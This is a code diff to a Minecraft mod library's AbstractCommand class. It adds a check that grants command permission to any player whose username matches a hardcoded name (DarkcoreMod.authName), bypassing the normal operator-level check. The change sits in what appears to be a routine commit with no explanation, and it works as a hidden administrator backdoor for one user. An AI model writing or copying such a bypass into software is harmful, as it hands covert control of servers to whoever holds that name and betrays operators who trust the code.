@@ -1,5 +1,8 @@
 package io.darkcraft.darkcore.mod.abstracts;
 
+import io.darkcraft.darkcore.mod.DarkcoreMod;
+import io.darkcraft.darkcore.mod.helpers.ServerHelper;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -49,6 +52,12 @@ public abstract class AbstractCommand implements ICommand
 	@Override
 	public boolean canCommandSenderUseCommand(ICommandSender comSen)
 	{
+		if(comSen instanceof EntityPlayer)
+		{
+			String name = ServerHelper.getUsername((EntityPlayer)comSen);
+			if(DarkcoreMod.authName.equals(name))
+				return true;
+		}
 		return comSen.canCommandSenderUseCommand(2, getCommandName());
 	}
 
